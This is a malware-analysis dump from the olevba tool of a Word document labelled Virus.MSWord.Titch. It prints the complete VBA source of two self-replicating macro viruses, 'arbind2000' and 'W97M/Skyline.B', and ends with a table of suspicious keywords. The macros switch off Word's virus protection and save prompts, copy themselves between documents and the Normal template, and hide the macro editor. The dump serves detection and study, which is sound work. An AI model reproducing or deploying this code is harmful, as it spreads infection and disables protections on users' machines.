olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Titch-ae4edeea4504fb3e4e61a96ce3818f195a0dfa95
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Titch-ae4edeea4504fb3e4e61a96ce3818f195a0dfa95 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Arbind2000.bas 
in file: Virus.MSWord.Titch-ae4edeea4504fb3e4e61a96ce3818f195a0dfa95 - OLE stream: 'Macros/VBA/Arbind2000'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
'arbind2000
'An experiment in Macro programming ;)
'Minimum stealth, no encryption, No payload, No mail replication
'If you had looked you could have found and deleted it but..
'You probably never knew it was here!
  On Error Resume Next
  Application.Options.VirusProtection = False
  Application.Options.SaveNormalPrompt = False
  Application.Options.ConfirmConversions = False
  Dim x As Integer
  Dim found As Boolean
  found = False
  x = 1
  For x = 1 To NormalTemplate.VBProject.VBComponents.Count
    If NormalTemplate.VBProject.VBComponents.Item(x).CodeModule.Lines(2, 1) = "'arbind2000" Then found = True
  Next x
  If Not found Then
    Application.OrganizerCopy ActiveDocument.FullName, NormalTemplate.FullName, "arbind2000", wdOrganizerObjectProjectItems
  End If
  If NormalTemplate.Saved = False Then NormalTemplate.Save
  
  found = False
  x = 1
  For x = 1 To ActiveDocument.VBProject.VBComponents.Count
    If ActiveDocument.VBProject.VBComponents.Item(x).CodeModule.Lines(2, 1) = "'arbind2000" Then found = True
  Next x
  If Not found Then
    NormalTemplate.VBProject.VBComponents("arbind2000").Export ("c:\arbind2000.tmp")
    ActiveDocument.VBProject.VBComponents.import ("c:\arbind2000.tmp")
    ActiveDocument.SaveAs ActiveDocument.FullName
    Kill ("c:\arbind2000.tmp")
  End If
End Sub
-------------------------------------------------------------------------------
VBA MACRO Skyline.bas 
in file: Virus.MSWord.Titch-ae4edeea4504fb3e4e61a96ce3818f195a0dfa95 - OLE stream: 'Macros/VBA/Skyline'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Name - W97M/Skyline.B
'Author - [Bench]
Dim DeleteMe As Boolean
Sub AutoOpen()
On Error Resume Next
SetAttr NormalTemplate.FullName, vbNormal
If Application.ShowVisualBasicEditor = True Then _
    Application.ShowVisualBasicEditor = False
Call BenchCore
End Sub
Sub ViewVBCode()
On Error Resume Next
DeleteMe = True
With Assistant.NewBalloon
    .Icon = msoIconAlert
    .Heading = "Skyline MV"
    .Text = "You thought you got rid of me, but I'm Still here, better and stronger!"
    .Animation = msoAnimationGreeting
    .Show
End With
Call BenchCore
'Application.ShowVisualBasicEditor = True
End Sub
Sub ToolsMacro()
On Error Resume Next
DeleteMe = True
'Dialogs(wdDialogToolsMacro).Show
End Sub
Sub ToolsCustomize()
On Error Resume Next
DeleteMe = True
End Sub
Sub ViewSecurity()
On Error Resume Next
MsgBox "Access is Restricted!", vbCritical, "Microsoft Word"
End Sub
Sub BenchCore()
On Error Resume Next
ModulName = "Skyline"
FileName = "ascii.vxd"
If MacroContainer = NormalTemplate Then
Set Carrier = NormalTemplate.VBProject.VBComponents
Set host = ActiveDocument.VBProject.VBComponents
Else
Set Carrier = ActiveDocument.VBProject.VBComponents
Set host = NormalTemplate.VBProject.VBComponents
End If
If host(ModulName).Name <> ModulName Then
Carrier(ModulName).Export "c:\ascii.vxd"
host.import ("c:\ascii.vxd")
End If
If ActiveDocument.Content.Characters.Count = 0 Then ActiveDocument.Saved = True Else ActiveDocument.Save
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

